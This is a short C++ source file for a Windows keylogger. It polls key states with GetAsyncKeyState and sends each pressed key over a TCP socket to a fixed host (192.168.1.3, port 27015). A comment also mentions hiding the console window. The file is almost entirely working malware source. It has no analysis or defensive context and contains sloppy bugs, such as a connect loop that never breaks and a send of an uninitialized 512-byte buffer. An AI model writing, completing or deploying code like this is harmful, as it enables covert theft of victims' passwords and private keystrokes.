#define WIN32_LEAN_AND_MEAN

//include heders
#include<windows.h>
#include<WinSock2.h>
#include<WS2tcpip.h>
#include<iostream>
#include<fstream>
#include<chrono>
#include<thread>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


using namespace std;


int main(){
    //for 1-1 connection initialize
WSADATA data;
    //client sock
SOCKET mysock = INVALID_SOCKET;
    //for hiding the window I'm catching the window with hwnd structure;
HWND mywind = GetConsoleWindow();
    //pointer tester,pointer,keeper
addrinfo *ptr,*result,hint;
int iresult;

iresult = WSAStartup(MAKEWORD(2,2),&data);
if(iresult != 0 ){
    cout<<"error";
}
    //allocate
ZeroMemory(&hint,sizeof(hint));
hint.ai_family = AF_INET;
hint.ai_protocol = IPPROTO_TCP;
hint.ai_socktype = SOCK_STREAM;
//get the address and write it to pointer struct
iresult = getaddrinfo("192.168.1.3","27015",&hint,&result);
if(iresult != 0) cout<<"addr error";
//pointer tester equals the pointer and when not connected next connection try until its corruted;
for(ptr = result;ptr != NULL;ptr = ptr->ai_next){
    //create the socked
    mysock = socket(ptr->ai_family,ptr->ai_socktype,ptr->ai_protocol);
    if(mysock == INVALID_SOCKET){
        cout<<"socketerror";
        WSACleanup();
    }
    //bind and connect
    iresult = connect(mysock,ptr->ai_addr,(int)ptr->ai_addrlen);


}
    //we are not using anymore so free memory;
freeaddrinfo(result);

if (mysock == INVALID_SOCKET) {
    printf("Unable to connect to server!\n");
    WSACleanup();
    return 1;
}

//buffer;
char* mychar = new char[512];
    while(iresult != SOCKET_ERROR){
for(int i = 0;i<100;i++){
    //take the key if pressed and write it in char format
        if(GetAsyncKeyState(i)& 0x8000){
            *mychar = (char)i;
            cout<<*mychar;
            //send it to socket;
            iresult = send(mysock,mychar,512,0);
        }
    
    
    
    
    }
  this_thread::sleep_for(70ms);
    }
}
